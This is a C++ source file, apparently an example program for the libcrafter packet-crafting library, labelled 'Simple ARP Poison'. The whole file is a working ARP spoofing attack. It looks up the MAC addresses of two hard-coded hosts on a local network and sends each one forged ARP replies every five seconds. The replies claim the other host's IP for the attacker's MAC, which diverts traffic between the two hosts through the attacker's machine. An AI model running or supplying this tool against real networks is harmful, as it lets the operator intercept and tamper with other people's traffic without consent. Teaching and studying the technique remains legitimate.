/*
 * Simple ARP Poison
 *
 * ARP Spoofing between two hosts. Simple program to illustrate the technique and
 * the library usage.
 */
#include <iostream>
#include <string>
#include <signal.h>
#include <crafter.h>

/* Collapse namespaces */
using namespace std;
using namespace Crafter;

volatile byte spoof = 1;

void ctrl_c(int dummy) {
	spoof = 0;
}

int main() {

	/* Set the interface */
	string iface = "wlan0";

	/* Get the IP address associated to the interface */
	string MyIP = GetMyIP(iface);
	/* Get the MAC Address associated to the interface */
	string MyMAC = GetMyMAC(iface);

	/* Host A IP address */
	string hostA = "192.168.0.101";
	/* HOst B IP address */
	string hostB = "192.168.0.1";

	/* This will send an ARP request for obtain HostA and HostB MAC address */
	string macA = GetMAC(hostA,iface);
	string macB = GetMAC(hostB,iface);

	/* Check if the hosts are alive */
	if(macA.size() == 0) {
		cout << "[@] Host " << hostA << " down. Aborting" << endl;
		return 1;
	}
	if(macB.size() == 0) {
		cout << "[@] Host " << hostB << " down. Aborting" << endl;
		return 1;
	}

	/* Print some info */
	cout << "[@] Attacker: " << MyIP  << " : " << MyMAC << endl;
	cout << "[@] HostA   : " << hostA << " : " << macA  << endl;
	cout << "[@] HostB   : " << hostB << " : " << macB  << endl;

	/* --------- Common data to all headers --------- */

	Ethernet ether_header;
	ether_header.SetSourceMAC(MyMAC);     // <-- Put my MAC as a source

	ARP arp_header;
	arp_header.SetOperation(ARP::Reply);  // <-- Set Operation (ARP Reply)

    /* ---------------------------------------------- */

	/*
	 * NOTE: Remember that each packet keeps its own copy of
	 * each layer pushed. So, you can safely modify later
	 * the <layer object> that was pushed on the packet.
	 */

	/* [++++++++++] --- Create packet for host A */
	Packet packetA;

	/* Put ethernet header information */
	ether_header.SetDestinationMAC(macA);

	/* Fill ARP header */
	arp_header.SetSenderIP(hostB);
	arp_header.SetSenderMAC(MyMAC);       // <-- Spoof IP address of host B
	arp_header.SetTargetIP(hostA);
	arp_header.SetTargetMAC(macA);

	/* Push both headers */
	packetA.PushLayer(ether_header);
	packetA.PushLayer(arp_header);
	/* Done packet for A ---------- [+++++++++++] */

	/* [++++++++++] --- Create packet for host B */
	Packet packetB;

	/* Put ethernet header information */
	ether_header.SetDestinationMAC(macB);

	/* Fill ARP header */
	arp_header.SetSenderIP(hostA);
	arp_header.SetSenderMAC(MyMAC);        // <-- Spoof IP address of host A
	arp_header.SetTargetIP(hostB);
	arp_header.SetTargetMAC(macB);

	/* Push both headers */
	packetB.PushLayer(ether_header);
	packetB.PushLayer(arp_header);
	/* Done packet for B ---------- [+++++++++++] */

	/* Set the signal handler */
	signal(SIGINT,ctrl_c);

	/* Loop until ctrl-c is pressed */
	while(spoof) {
		/* Send both packets */
		packetA.Send(iface);
		packetB.Send(iface);
		/* Wait a few seconds */
		sleep(5);
	}

	cout << "[@] Done! " << endl;

	return 0;
}
